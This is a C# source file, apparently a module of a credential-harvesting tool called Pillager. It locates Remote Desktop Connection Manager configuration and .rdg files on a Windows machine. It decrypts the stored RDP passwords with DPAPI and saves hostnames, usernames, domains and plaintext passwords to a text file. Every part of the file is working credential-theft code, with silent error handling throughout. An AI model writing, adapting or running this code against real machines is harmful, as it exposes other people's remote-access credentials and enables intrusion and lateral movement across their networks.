using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Pillager.Tools
{
    internal class RDCMan : ICommand
    {
        public string DecryptPwd()
        {
            StringBuilder sb = new StringBuilder();
            var RDGFiles = new List<string>();
            var RDCManSettings = new XmlDocument();
            string rdgPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Remote Desktop Connection Manager\RDCMan.settings";
            RDCManSettings.LoadXml(File.ReadAllText(rdgPath));
            var nodes = RDCManSettings.SelectNodes("//FilesToOpen");
            foreach (XmlNode node in nodes)
            {
                var RDGFilePath = node.InnerText;
                if (!RDGFiles.Contains(RDGFilePath))
                {
                    RDGFiles.Add(RDGFilePath);
                }
            }
            foreach (string RDGFile in RDGFiles)
            {
                sb.AppendLine(ParseRDGFile(RDGFile));
            }
            return sb.ToString();
        }

        private string DecryptPassword(string password)
        {
            byte[] passwordBytes = Convert.FromBase64String(password);
            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser)).Replace("\0", "");
            return password;
        }

        private string ParseRDGFile(string RDGPath)
        {
            StringBuilder stringBuilder = new StringBuilder();
            try
            {
                XmlDocument RDGFileConfig = new XmlDocument();
                RDGFileConfig.LoadXml(File.ReadAllText(RDGPath));
                XmlNodeList nodes = RDGFileConfig.SelectNodes("//server");
                foreach (XmlNode node in nodes)
                {
                    string hostname = string.Empty, profilename = string.Empty, username = string.Empty, password = string.Empty, domain = string.Empty;
                    foreach (XmlNode subnode in node)
                    {
                        foreach (XmlNode subnode_1 in subnode)
                        {
                            switch (subnode_1.Name)
                            {
                                case "name":
                                    hostname = subnode_1.InnerText;
                                    break;
                                case "profileName":
                                    profilename = subnode_1.InnerText;
                                    break;
                                case "userName":
                                    username = subnode_1.InnerText;
                                    break;
                                case "password":
                                    password = subnode_1.InnerText;
                                    break;
                                case "domain":
                                    domain = subnode_1.InnerText;
                                    break;
                            }
                        }
                    }

                    if (!string.IsNullOrEmpty(password))
                    {
                        var decrypted = DecryptPassword(password);
                        if (!string.IsNullOrEmpty(decrypted))
                        {
                            stringBuilder.AppendLine("hostname: " + hostname);
                            stringBuilder.AppendLine("profilename: " + profilename);
                            stringBuilder.AppendLine("username: " + $"{domain}\\{username}");
                            stringBuilder.AppendLine("decrypted: " + decrypted);
                            stringBuilder.AppendLine();
                        }
                    }
                }
            }
            catch { }
            return stringBuilder.ToString();
        }

        public override void Save(string path)
        {
            try
            {
                string rdgPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Remote Desktop Connection Manager\RDCMan.settings";
                if (!File.Exists(rdgPath)) return;
                string savepath = Path.Combine(path, "RDCMan");
                Directory.CreateDirectory(savepath);
                string output = DecryptPwd();
                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "RDCMan.txt"), output, Encoding.UTF8);
            }
            catch { }
        }
    }
}
